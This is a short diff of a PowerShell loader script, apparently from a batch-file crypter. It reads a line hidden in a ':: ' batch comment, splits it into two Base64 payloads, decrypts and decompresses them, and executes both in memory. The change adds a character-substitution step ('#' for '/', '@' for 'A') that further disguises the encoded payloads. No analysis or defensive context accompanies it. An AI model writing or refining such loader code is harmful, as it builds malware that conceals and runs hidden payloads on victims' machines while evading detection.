@@ -38,12 +38,12 @@ foreach ($line_var in $contents_var)
 {
 	if ($line_var.StartsWith(':: '))
 	{
-		$lastline_var=$line_var.Substring(3);
+		$lastline_var=$line_var.Substring(20);
 		break;
 	}
 }
 $payloads_var=[string[]]$lastline_var.Split('\');
-$payload1_var=decompress_function (decrypt_function ([Convert]::FromBase64String($payloads_var[0])));
-$payload2_var=decompress_function (decrypt_function ([Convert]::FromBase64String($payloads_var[1])));
+$payload1_var=decompress_function (decrypt_function ([Convert]::FromBase64String($payloads_var[0].Replace('#', '/').Replace('@', 'A'))));
+$payload2_var=decompress_function (decrypt_function ([Convert]::FromBase64String($payloads_var[1].Replace('#', '/').Replace('@', 'A'))));
 execute_function $payload1_var $null;
 execute_function $payload2_var (,[string[]] ('%*'));
